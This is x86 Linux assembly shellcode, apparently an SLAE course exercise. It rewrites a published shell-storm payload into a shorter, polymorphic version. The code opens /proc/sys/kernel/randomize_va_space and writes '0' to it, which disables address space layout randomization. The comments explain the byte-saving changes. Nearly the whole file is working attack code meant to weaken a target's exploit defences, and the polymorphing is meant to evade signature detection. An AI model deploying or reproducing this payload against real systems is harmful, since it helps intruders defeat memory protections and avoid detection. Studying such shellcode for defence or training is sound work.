; File: disable-random-smaller.nasm
; Author: Gitsnik SLAE-431
; Website: http://dracyrys.com/
;
; This is a rewrite of the shellstorm code
; (106 bytes) written by Jonathan Salwan
; 37 lines.
;
; Considering who this shellcode is by I
; am a bit surprised at how it is laid out.
;
; As always, first I have converted this to
; Intel, rewritten it to be shorter shellcode
; ( 81 bytes 9/37 lines) before polymorphing the
; left overs.
;
; /proc/sys/kernel//randomize_va_space

global _start

section .text

_start:

	xor ecx, ecx
	mul ecx

	;push 0x61
	;mov ebx, esp
	;mov al, 0x0a	; Why is he unlinking "a" here ????
	;int 0x80

	;
	; The items here that are out of
	; alignment are because I put a
	; double slash in rather than pushing
	; a word. I could put them all out
	; of alignment by putting the // at
	; the start of the string. Haha.
	;

	push eax	; null
	push 0x65636170	; ecap
	push 0x735f6176	; s_av
	push 0x5f657a69	; _ezi
	push 0x6d6f646e	; modn
	push 0x61722f2f	; ar//
	push 0x6c656e72	; lenr [same]
	push 0x656b2f73	; ek/s [same]
	push 0x79732f63	; ys/c [same]
	push 0x6f72702f	; orp/ [same]

	mov ebx, esp	; ebx has string [same]

	;add al, 0x11	; useless, syscall break?
			; is xor'd out a few lines
			; down anyway

	add cx, 0x441	; flags O_WRONLY|O_CREAT|O_APPEND

	;xor edx, edx
	add dx, 0x1a4	; 0644

	add al, 0x05	; open()
	int 0x80	; [same]

	xchg ebx, eax	; cheaper than mov ebx, eax

	;xor ecx, ecx	; no point before loading esp into
			; it.

	push 0x30	; 0 ascii
	mov ecx, esp

	;xor edx, edx	; [same]
	;inc edx

	xor eax, eax	; [same]

	cdq		; cheaper to put this down here
	inc edx		; after we clear EAX, saves us
			; a byte 

	add al, 0x4	; write()
	int 0x80	; [same]

			; write returns number of bytes
			; written, and we're only writing
			; 1
	int 0x80	; [same]
